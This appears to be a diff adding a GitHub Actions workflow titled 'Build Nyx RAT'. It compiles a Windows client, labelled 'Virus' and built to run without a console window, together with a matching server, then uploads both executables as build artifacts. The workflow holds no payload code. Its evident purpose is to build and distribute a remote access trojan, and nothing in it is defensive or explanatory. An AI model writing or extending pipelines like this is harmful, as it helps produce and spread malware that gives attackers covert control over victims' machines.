@@ -1,0 +1,29 @@
+name: Build Nyx RAT
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Build Client (Virus)
+      run: |
+        cl /EHsc /O2 client.cpp /link /SUBSYSTEM:WINDOWS user32.lib gdi32.lib gdiplus.lib winmm.lib
+        move client.exe client.exe
+    
+    - name: Build Server
+      run: |
+        cl /EHsc /O2 server.cpp /link ws2_32.lib user32.lib
+        move server.exe server.exe
+    
+    - name: Upload Artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: Nyx-RAT-Builds
+        path: |
+          *.exe
